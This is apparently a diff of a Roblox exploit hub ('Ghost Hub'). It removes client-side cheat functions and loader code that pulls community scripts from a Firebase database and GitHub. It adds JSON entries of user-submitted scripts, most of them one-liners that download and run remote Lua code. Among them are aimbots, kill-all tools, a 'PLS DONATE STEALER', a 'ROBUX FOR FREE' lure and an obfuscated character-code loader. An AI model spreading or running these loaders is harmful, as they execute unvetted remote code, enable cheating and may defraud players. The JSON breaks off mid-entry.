- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true) 
- game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
-end
-
-local LoopSpawnpoint = false
-local Spawnpoint = nil
-function Main61()
- Spawnpoint = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
- LoopSpawnpoint = true
-
- local function ExecuteSpawnpoint()
-  game.Players.LocalPlayer.Character.Humanoid.Died:Connect(function()
-  game.Players.LocalPlayer.CharacterAdded:wait()
-  repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-  if LoopSpawnpoint == true then
-     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Spawnpoint
-     ExecuteSpawnpoint()
-  end
-  end)
- end
- ExecuteSpawnpoint()
- RequestMessage("Script","Spawnpoint","Enabled")
-end
-
-function Main62()
- LoopSpawnpoint = false
- Spawnpoint = nil
- RequestMessage("Script","Spawnpoint","Disabled")
-end
-
-function Main63()
- local StarterGui = game:GetService('StarterGui')
- StarterGui:SetCore("ResetButtonCallback",true)
-end
-
-function Main64()
- local StarterGui = game:GetService('StarterGui')
- StarterGui:SetCore("ResetButtonCallback",false)
-end
-
-local hiddenGUIS = {}
-function Main65()
- for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
-   if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and v.Visible then
-      v.Visible = false
-      table.insert(hiddenGUIS,v)
-   end
- end
-end
-
-function Main66()
- for i,v in pairs(hiddenGUIS) do
-   v.Visible = true
- end
- hiddenGUIS = {}
-end
-
-
-function Main67()
- for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
-   if v:IsA("Decal") and v.Name == 'face' then
-      v:Destroy()
-   end
- end
-end
-
-function Main68()
- game.Players.LocalPlayer.Character.RightUpperArm:Destroy()
- game.Players.LocalPlayer.Character.LeftUpperArm:Destroy()
- game.Players.LocalPlayer.Character["Right Arm"]:Destroy()
- game.Players.LocalPlayer.Character["Right Arm"]:Destroy()
-end
-
-function Main69()
- game.Players.LocalPlayer.Character.RightUpperLeg:Destroy()
- game.Players.LocalPlayer.Character.LeftUpperLeg:Destroy()
- game.Players.LocalPlayer.Character["Right Leg"]:Destroy()
- game.Players.LocalPlayer.Character["Right Leg"]:Destroy()
-end
-
-function Main70()
- ChooseRepetision = false
- getgenv().Choose = true
- while getgenv().Choose == true do
-  if ChooseRepetision == false then
-     ChooseRepetision = true
-     randomizer = 0 
-     for _, v in next, (game.Players:GetChildren()) do
-       randomizer = math.random(1,100)
-       if randomizer >= 99 then
-          getgenv().Choose = false
-          RequestMessage("Script",v.Name,"")
-       end
-     end
-     ChooseRepetision = false
-  end
-  print()
-  game:GetService("RunService").Heartbeat:wait();
- end;
-end
-
-function Main71()
- local UsingTool = nil
- local message1 = nil
- local message2 = nil
- if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
-    message1 = "Tool Name"
-    message2 = ""..game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
-    UsingTool = ""..game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
- else
-    if game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool") then
-       game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
-       message1 = "Tool Name"
-       message2 = ""..game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
-       UsingTool = ""..game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
-    end
- end
- if UsingTool == nil then
-    message1 = "Tool Not Found"
-    message2 = ""
- end
- RequestMessage("Script",message1,message2)
-end
-
-HumanoidNumberName = 0
-function Main72()
- if game.Players.LocalPlayer.Character then
-    if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
-       HumanoidNumberName += 1
-       game.Players.LocalPlayer.Character.Humanoid.Name = HumanoidNumberName
-    end
-     local l = game.Players.LocalPlayer.Character[HumanoidNumberName]:Clone()
-     l.Parent = game.Players.LocalPlayer.Character
-     l.Name = "Humanoid"; wait(0.1)
-     game.Players.LocalPlayer.Character[HumanoidNumberName]:Destroy()
-     workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
-     game.Players.LocalPlayer.Character.Animate.Disabled = true; wait(0.1)
-     game.Players.LocalPlayer.Character.Animate.Disabled = false
- end
-end
----
-
-
-
-
-
-
-local MoreScripts
-local data
-local data2
-
----Update Data Function
-function UpdateData()
- local URL = "https://ghosthub-more-72dde-default-rtdb.firebaseio.com/"
- local database = URL..".json"
- data = game.HttpService:JSONDecode(game:HttpGetAsync(database)) or {}
- 
- ---Get More Scripts From Github And Add to the data1 Table
- data2 = game.HttpService:JSONDecode(game:HttpGetAsync("https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Ghost%20Hub%20MoreScript.txt"))
- if not data.Scripts then
-    data["Scripts"] = {}
- end
- for key, value in pairs(data2.Scripts) do  
-   data.Scripts[key] = {
-    ["Date"] = value.Date,
-    ["Description"] = value.Description,
-    ["Script"] = value.Script,
-    ["Script_Title"] = value["Script_Title"],
-    ["User_ID"] = value["User_ID"],
-    ["Username"] = value.Username
-  }
- end
- ---
-end
----
-
-
----Get More Scripts From Database Function
-function GetMoreScript()
- if data["Current_Script_ID"] then
-    MoreScripts = data["Current_Script_ID"]["Script_ID"]
- else 
-    MoreScripts = 10000
- end
- MSButtonPosX = 0
- MSButtonPosZ = 0.00006
- MSButtonSlotNum = 0
- 
- if MoreScripts ~= 0 then
-    if MoreScriptSearch.Text == "" and data["Current_Script_ID"] ~= nil then
-       AddMoreScriptButton(1, "Add Script", "loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Ghost%20Hub%20Add%20Script'))()", "You can add your script using this script", "2568780515", "Admin", "Oct 29 2024") --This is for Add Script Button
-    end
-    
-    ---Get Pined Script As for Highlights
-    if FileScriptSupported == true and MoreScriptSearch.Text == "" and isfile("Ghosthub/Favorites.json") then
-       local favorites = game.HttpService:JSONDecode(readfile("Ghosthub/Favorites.json"))
-       local favoriteId = favorites["Current_Script_ID"]
-       repeat
-         if favorites.Favorites["Script"..favoriteId] and data.Scripts["Script"..favorites.Favorites["Script"..favoriteId]["Script_ID"]] ~= nil then
-            local favoritescriptId = favorites.Favorites["Script"..favoriteId]["Script_ID"]
-            AddMoreScriptButton(favoritescriptId, data.Scripts["Script"..favoritescriptId]["Script_Title"], data.Scripts["Script"..favoritescriptId]["Script"], data.Scripts["Script"..favoritescriptId]["Description"], data.Scripts["Script"..favoritescriptId]["User_ID"], data.Scripts["Script"..favoritescriptId].Username, data.Scripts["Script"..favoritescriptId].Date, true, favoriteId)
-         end
-         favoriteId -= 1
-       until favoriteId == 0
-    end
-    ---
-    
-    while MoreScripts ~= 0 do
-      if data.Scripts["Script"..MoreScripts] then
-         local ScriptTitle = ""..data.Scripts["Script"..MoreScripts]["Script_Title"]
-         if MoreScriptSearch.Text == "" or MoreScriptSearch.Text ~= "" and ScriptTitle.find(string.lower(ScriptTitle), string.lower(MoreScriptSearch.Text)) then
-            AddMoreScriptButton(MoreScripts, ScriptTitle, data.Scripts["Script"..MoreScripts]["Script"], data.Scripts["Script"..MoreScripts]["Description"], data.Scripts["Script"..MoreScripts]["User_ID"], data.Scripts["Script"..MoreScripts].Username, data.Scripts["Script"..MoreScripts].Date)
-            MoreScripts -= 1
-         elseif MoreScriptSearch.Text ~= "" and not ScriptTitle.find(string.lower(ScriptTitle), string.lower(MoreScriptSearch.Text)) then
-            MoreScripts -= 1
-         end
-      else
-         MoreScripts -= 1
-      end
-    end
- end
-end
----
-
-
-
-
-
----Add Click in Ghosthub Users Database function
-local function AddClick()
- local database = UsersURL..Country..".json"
- local request = request or syn.request
- local Table = {}
- 
- if UsersTable[Country] ~= nil then
-    Table["Clicks"] = UsersTable[Country].Clicks + 1
-    Table["Flag"] = Flag
- else
-    Table["Clicks"] = 1
-    Table["Flag"] = Flag
- end
- 
- local send = request({
-   Url = database,
-   Method = "PUT",
-   Headers = {["Content-Type"] = "application/json"},
-   Body = game.HttpService:JSONEncode(Table)
- })
-end
----
-
-
-
-UpdateData()
-GetMoreScript()
-AddClick()
+"Script2817": {
+      "Date": "December 15 2024",
+      "Description": "it doesn't work",
+      "Script": "loadstring(game:HttpGet(\"https://proxi-hub.com/flicker.lua\"))();",
+      "Script_Title": "don't work",
+      "User_ID": 7657605354,
+      "Username": "urlocalexp_loiter"
+    },
+    "Script2818": {
+      "Date": "December 15 2024",
+      "Description": "auto Farm",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Blox-Fruits-OP-HUB-AUTO-FARM-INSANE-MONEY-QUESTS-AND-MORE-19928\"))()",
+      "Script_Title": "blox fruits script",
+      "User_ID": 3123814256,
+      "Username": "negodopaio"
+    },
+    "Script2819": {
+      "Date": "December 14 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua\",true))()",
+      "Script_Title": "idk",
+      "User_ID": 7677409312,
+      "Username": "nnnnnnn999666"
+    },
+    "Script2820": {
+      "Date": "December 14 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/gclich/GHUBV13S/main/GHUBv13S.txt\"))()",
+      "Script_Title": "nnn",
+      "User_ID": 7677409312,
+      "Username": "nnnnnnn999666"
+    },
+    "Script2821": {
+      "Date": "December 15 2024",
+      "Description": "Doors Script Item OP work for JJslopit and Solara and more",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/CatEnddroid/Kitty-Cats-Doors-Beta/refs/heads/main/hub.lua\"))()",
+      "Script_Title": "Doors Item script",
+      "User_ID": 2538211046,
+      "Username": "Pae0550"
+    },
+    "Script2822": {
+      "Date": "December 15 2024",
+      "Description": "loopkill, freecam, kill all, 😗😲",
+      "Script": "loadstring(game:HttpGet(('https://raw.githubusercontent.com/Dan41/Scripts/main/%5BCHAOS%5D%20CHAOTIC%20HUB.lua'),true))()",
+      "Script_Title": "chaos script",
+      "User_ID": 3447744059,
+      "Username": "ayo_eww"
+    },
+    "Script2823": {
+      "Date": "December 15 2024",
+      "Description": "Handjob is a good thing.",
+      "Script": "loadstring(game:HttpGet(\"https://pastefy.app/wa3v2Vgm/raw\"))(\"Spider Script\")",
+      "Script_Title": "Handjob",
+      "User_ID": 7703145442,
+      "Username": "TestingBypassPaid"
+    },
+    "Script2824": {
+      "Date": "December 15 2024",
+      "Description": "Here use my script free Follow me in roblox name:b0ssjkl0666",
+      "Script": "loadstring(game:HttpGet(('https://pastebin.com/raw/9QyWJ5n1'),true))()",
+      "Script_Title": "B0ssjkl0666MySCRIPT",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2825": {
+      "Date": "December 15 2024",
+      "Description": "script copy avatar universal funciona 99%",
+      "Script": "--[[\n\tWARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!\n]]\nloadstring(\"\\108\\111\\97\\100\\115\\116\\114\\105\\110\\103\\40\\103\\97\\109\\101\\58\\72\\116\\116\\112\\71\\101\\116\\40\\34\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\117\\115\\101\\114\\99\\111\\110\\116\\101\\110\\116\\46\\99\\111\\109\\47\\73\\110\\118\\111\\111\\107\\101\\114\\49\\49\\47\\79\\117\\116\\102\\105\\116\\47\\109\\97\\105\\110\\47\\79\\117\\116\\102\\105\\116\\67\\111\\112\\105\\101\\114\\46\\108\\117\\97\\34\\44\\32\\116\\114\\117\\101\\41\\41\\40\\41\\10\")()\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n",
+      "Script_Title": "copy avatar universa",
+      "User_ID": 5676772168,
+      "Username": "eieururi57"
+    },
+    "Script2826": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()",
+      "Script_Title": "redz hub",
+      "User_ID": 7574490478,
+      "Username": "dough25358"
+    },
+    "Script2827": {
+      "Date": "December 15 2024",
+      "Description": "yes it dont workUSELESS its for slap battles",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/FISHING-Slap-Battles-op-script-idk-24463\"))()",
+      "Script_Title": "Slap battles yes",
+      "User_ID": 5738662621,
+      "Username": "aFz_noob095"
+    },
+    "Script2828": {
+      "Date": "December 15 2024",
+      "Description": "only works on hereos battlegrounds",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/WELPCASED/Hero-s-hub-work/main/Hero%E2%80%99s%20script\", true))()",
+      "Script_Title": "heros battlegrounds",
+      "User_ID": 7686723235,
+      "Username": "jdjsdjdjfn"
+    },
+    "Script2829": {
+      "Date": "December 15 2024",
+      "Description": "LDSHUB-IhXlg8y6VnAp25IdaoW This is the key🔐🔑😊Follow me in roblox name:b0ssjkl0666",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/SenhorLDS/ProjectLDSHUB/main/OfficialScript'))()",
+      "Script_Title": "Tower|Key in descrip",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2830": {
+      "Date": "December 15 2024",
+      "Description": "👗Dress to impress (OP GUI)👗MAKE SURE TO FOLLOW ME IN ROBLOX NAMW:b0ssjkl0666😊💖",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Yumiara/Python/refs/heads/main/DTI.py\"))(); ",
+      "Script_Title": "Dress To impress Gui",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2831": {
+      "Date": "December 15 2024",
+      "Description": "Thanks for using my script hope this is usefull😊(New Script Creator!)😘",
+      "Script": "loadstring(game:HttpGet(('https://raw.githubusercontent.com/debug42O/Ez-Industries-Launcher-Data/master/Launcher.lua'),true))()",
+      "Script_Title": "Ez|HubBy:b0ssjkl0666",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2832": {
+      "Date": "December 15 2024",
+      "Description": "The strongest backround Gui(OP!)just click THE UP BUTTON!to see feauture Enjoy!🥰♥️!",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/2MmEqN9c\"))()",
+      "Script_Title": "TheStrongestBackgrnd",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2833": {
+      "Date": "December 15 2024",
+      "Description": "you can use my script (MEEPCITY)Maybe this is work in Tubers93CreationTHIS IS (OP)gui😎!",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/synolope/mpcity/main/loader.lua\",true))()",
+      "Script_Title": "Meepcity:b0ssjkl0666",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2834": {
+      "Date": "December 15 2024",
+      "Description": "Credits:Baconboss on youtube",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/BaconBossScript/BeeconHub/main/BeeconHub\"))()\n",
+      "Script_Title": "Bacon hub 36+ games ",
+      "User_ID": 3713735286,
+      "Username": "Shizoid_Isanitartop"
+    },
+    "Script2835": {
+      "Date": "December 15 2024",
+      "Description": "Use my script now!🥰Follow me in roblox name: shewithepanda to play with me!😊b0ssjkl0",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua\"))()",
+      "Script_Title": "Its my Script:Jkl0",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2836": {
+      "Date": "December 15 2024",
+      "Description": "Work At Pizza place Gui by: b0ssjkl0666😊You can use my script with autoFarm only|More?",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/oShyyyyy/iris-jhub/main/WorkAtpizzaplace'))()",
+      "Script_Title": "Work At Pizza place!",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2837": {
+      "Date": "December 15 2024",
+      "Description": "wöwleö",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/MADNESSTEST/Pqoeirnfjw/main/AP3-5.lua\"))()",
+      "Script_Title": "ROBUX FOR FREE",
+      "User_ID": 2752475468,
+      "Username": "poyraz22112"
+    },
+    "Script2838": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Blox-Fruits-OP-GUI-WITH-AUTOFARM-23948\"))()",
+      "Script_Title": "This is blox fruits",
+      "User_ID": 5738662621,
+      "Username": "aFz_noob095"
+    },
+    "Script2839": {
+      "Date": "December 15 2024",
+      "Description": "I tested on dragon update and it works",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\", true))()",
+      "Script_Title": "Speed hub works new ",
+      "User_ID": 4871414055,
+      "Username": "Block_S3"
+    },
+    "Script2840": {
+      "Date": "December 15 2024",
+      "Description": "Furry infection",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Furry-Infection-game-Furinfection-Kill-Aura-Kill-All-And-More-20085\"))()",
+      "Script_Title": "LoL",
+      "User_ID": 3803597867,
+      "Username": "Piecmoch1"
+    },
+    "Script2841": {
+      "Date": "December 15 2024",
+      "Description": "Idc",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Furry-Infection-game-Furinfection-Kill-Aura-Kill-All-And-More-20085\"))()",
+      "Script_Title": "Furry Infection",
+      "User_ID": 3803597867,
+      "Username": "Piecmoch1"
+    },
+    "Script2842": {
+      "Date": "December 15 2024",
+      "Description": "from the dragon update",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\", true))()",
+      "Script_Title": "Speed x hub",
+      "User_ID": 3014880053,
+      "Username": "aira_harlee"
+    },
+    "Script2843": {
+      "Date": "December 15 2024",
+      "Description": "U will have the most keyless scripts",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/scripthubekitten/SCRIPTHUBV3/main/SCRIPTHUBV3\", true))()",
+      "Script_Title": "Best script all game",
+      "User_ID": 7686590730,
+      "Username": "BecomeChillguy"
+    },
+    "Script2844": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()",
+      "Script_Title": "swagmode",
+      "User_ID": 7093737426,
+      "Username": "TEAM_lPRO0"
+    },
+    "Script2845": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "require(11560761226).HD(\"sknduawb\")",
+      "Script_Title": "Require",
+      "User_ID": 4545045587,
+      "Username": "sknduawb"
+    },
+    "Script2846": {
+      "Date": "December 15 2024",
+      "Description": "teletransporte tool",
+      "Script": "loadstring(game:HttpGet(\"https://scriptblox.com/raw/Universal-Script-Q-tool-tp-7709\"))()",
+      "Script_Title": "teletransporte tool",
+      "User_ID": 3909698407,
+      "Username": "Angel_fernando31"
+    },
+    "Script2847": {
+      "Date": "December 15 2024",
+      "Description": "idk",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/EnzoLeo127/Scripts/main/WICKEDRP\"))()",
+      "Script_Title": "wicked rp ugc",
+      "User_ID": 6090547666,
+      "Username": "TheUnknown01011"
+    },
+    "Script2848": {
+      "Date": "December 15 2024",
+      "Description": "Idk",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/EnzoLeo127/Scripts/main/WICKEDRP\"))()",
+      "Script_Title": "wicked rp",
+      "User_ID": 6090547666,
+      "Username": "TheUnknown01011"
+    },
+    "Script2849": {
+      "Date": "December 15 2024",
+      "Description": "ayo gng this is W script",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/SigmaSploiter1/Plasma-Scripts/refs/heads/main/SLS.txt\"))()",
+      "Script_Title": "super league soccer ",
+      "User_ID": 7700847067,
+      "Username": "imtakingshi"
+    },
+    "Script2850": {
+      "Date": "December 15 2024",
+      "Description": "this is from ghostplayer! ",
+      "Script": "loadstring(game:HttpGet('https://pastefy.app/S7xNJSXX/raw'))()execute(\"Script18\")",
+      "Script_Title": "Script avater change",
+      "User_ID": 2538211046,
+      "Username": "Pae0550"
+    },
+    "Script2851": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Dandy's-World-ALPHA-Hex233222-Hub-Update-22378\"))()",
+      "Script_Title": "Dandys world",
+      "User_ID": 1969930846,
+      "Username": "yolz21l"
+    },
+    "Script2852": {
+      "Date": "December 15 2024",
+      "Description": "dance",
+      "Script": "--- Keybind to open for pc is \"comma\" -> \" , \"\n-- Made by Gi#7331\n\nloadstring(game:HttpGet(\"https://pastebin.com/raw/eCpipCTH\"))()",
+      "Script_Title": "dance",
+      "User_ID": 2034671339,
+      "Username": "fares213u"
+    },
+    "Script2853": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Free-fe-animation-17111\"))()",
+      "Script_Title": "fe animation__",
+      "User_ID": 3354676898,
+      "Username": "YOUTUNBG"
+    },
+    "Script2854": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Scripterxzx/PLS-DONATE/refs/heads/main/PLS%20DONATE%20STEALER'))()",
+      "Script_Title": "PLS DONATE STEALER",
+      "User_ID": 5098155203,
+      "Username": "SinnVamp"
+    },
+    "Script2855": {
+      "Date": "December 15 2024",
+      "Description": "script seacher thing",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-ECCS-Searcher-V27-22111\"))()",
+      "Script_Title": "eccs",
+      "User_ID": 7055179696,
+      "Username": "colinballin203"
+    },
+    "Script2856": {
+      "Date": "December 15 2024",
+      "Description": "blox fruit DRAGON UPDATE ",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\", true))()",
+      "Script_Title": "blox fruit DRAGON UP",
+      "User_ID": 1543850484,
+      "Username": "Rob7u6yr4"
+    },
+    "Script2857": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/yzeedw/Mortalv2-main/main/UNIVERSAL%20AIMBOT\"))()",
+      "Script_Title": "aimbot",
+      "User_ID": 7637807606,
+      "Username": "idieydhxidhd"
+    },
+    "Script2858": {
+      "Date": "December 15 2024",
+      "Description": "-- Made by axew on vermillion\nfor i,v in pairs (game.Workspace:GetChildren()) do\nif v.Name",
+      "Script": "-- Made by axew on vermillion\nfor i,v in pairs (game.Workspace:GetChildren()) do\nif v.Name == \"Nuke\" then\nv:Destroy()\nend\nend\nwait(1)\nlocal Tool = Instance.new(\"HopperBin\", game.Players.LocalPlayer.Backpack)\nTool.Name = \"Detonater\"\nlocal Mouse = game.Players.LocalPlayer:GetMouse()\n\nlocal Place = Instance.new(\"HopperBin\", game.Players.LocalPlayer.Backpack)\nPlace.Name = \"Placer\"\nNuke = Instance.new(\"Model\")\nNuke.Parent = game.Workspace\nNuke.Name = \"Nuke\"\n\nx5 = 1\nMouse.Button1Down:connect(function()\nif x5 == 1 then\nif Place.Active == true then\nlocal name = game.Players.LocalPlayer.Name\nlocal Part1 = Instance.new(\"Part\")\nPart1.Name = \"Part\"\nPart1.Parent = Nuke\nPart1.Size = Vector3.new(12,1,6)\nPart1.Position = Mouse.Hit.p\nPart1.BottomSurface = \"Smooth\"\nPart1.TopSurface = \"Smooth\"\nPart1.Material = \"Metal\"\nPart1.BrickColor = BrickColor.new(\"Really black\")\nPart1.Anchored = true\nlocal x1 = game.Workspace.Nuke.Part.Position.X\nlocal y1 = game.Workspace.Nuke.Part.Position.Y\nlocal z1 = game.Workspace.Nuke.Part.Position.Z\nlocal Part2 = Instance.new(\"Part\")\nPart2.Name = \"Detonate\"\nPart2.Parent = Nuke\nPart2.Size = Vector3.new(10, 5, 5)\nPart2.Position = Vector3.new(x1,y1+2,z1)\nPart2.BottomSurface = \"Smooth\"\nPart2.TopSurface = \"Smooth\"\nPart2.Material = \"Metal\"\nPart2.BrickColor = BrickColor.new(\"Really black\")\nPart2.Anchored = true\nPart2.Shape = \"Cylinder\"\nx5 = x5+1\nlocal Decal = Instance.new(\"Decal\")\nDecal.Texture = \"http://www.roblox.com/asset/?id=14301975\"\nDecal.Parent = Part2\nDecal.Face = \"Back\"\nend\nend\nend)\n\n\nMouse.Button1Down:connect(function()\nif Tool.Active == true then\nlocal nuke = Instance.new(\"Part\")\nnuke.Position = game.Workspace.Nuke.Detonate.Position\nnuke.Anchored = true\nnuke.Parent = game.Workspace\nlocal x, y, z = 5, 5, 5\nnuke.BrickColor = BrickColor.new (\"New Yeller\")\nnuke.Size = Vector3.new(x, y, z)\nnuke.CanCollide = false\nnuke.Name = \"nuke\"\nnuke.Shape = \"Ball\"\nnuke.Transparency = 0.3\nnuke.Material = \"Neon\"\nnuke.Locked = true\ngame.Workspace.Nuke:Destroy()\nwhile x <= 100 do\nx, y, z = x+1, y+1, z+1\nnuke.Size = Vector3.new(x, y, z)\nlocal explosion = Instance.new(\"Explosion\")\nexplosion.BlastPressure = 1000000\nexplosion.BlastRadius = x-15\nexplosion.DestroyJointRadiusPercent = 1\nexplosion.ExplosionType = \"Craters\"\nexplosion.Parent = game.Workspace\nexplosion.Position = game.Workspace.nuke.Position\nexplosion.Hit:connect(function(Part, Distance)\nif Part.Name ~= \"nuke\" then\nPart.Anchored = false\nPart:BreakJoints()\nend\nend)\nwait(0.01)\nend\nwhile x <= 200 do\nx, y, z = x+3, y+3, z+3\nnuke.Size = Vector3.new(x, y, z)\nlocal explosion = Instance.new(\"Explosion\")\nexplosion.BlastPressure = 1000000\nexplosion.BlastRadius = x+50\nexplosion.DestroyJointRadiusPercent = 1\nexplosion.ExplosionType = \"Craters\"\nexplosion.Parent = game.Workspace\nexplosion.Position = game.Workspace.nuke.Position\nexplosion.Hit:connect(function(Part, Distance)\nif Part.Name ~= \"nuke\" then\nPart.Anchored = false\nPart:BreakJoints()\nend\nend)\nwait(0.01)\nend\ngame.Workspace.nuke:Destroy()\nx5 = 1\nNuke = Instance.new(\"Model\")\nNuke.Parent = game.Workspace\nNuke.Name = \"Nuke\"\nTool.Active = false\nend\nend)",
+      "Script_Title": "lol",
+      "User_ID": 7623401406,
+      "Username": "kskwk571"
+    },
+    "Script2859": {
+      "Date": "December 15 2024",
+      "Description": "This is beta",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/cf27f931-b670-4767-b517-24d1896daaea_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls Donate Auto Beg",
+      "User_ID": 1953207419,
+      "Username": "rorobob110"
+    },
+    "Script2860": {
+      "Date": "December 15 2024",
+      "Description": ":D",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/brosula123/CAMLOCK/main/SKIBIDI\"))()",
+      "Script_Title": "blox fruit aimbot",
+      "User_ID": 7057595357,
+      "Username": "ThaoNghivxke09767"
+    },
+    "Script2861": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/tapboundcc/tapbound/main/camlock/by%20%23xvsfi'))()",
+      "Script_Title": "aimlock 2",
+      "User_ID": 7637807606,
+      "Username": "idieydhxidhd"
+    },
+    "Script2862": {
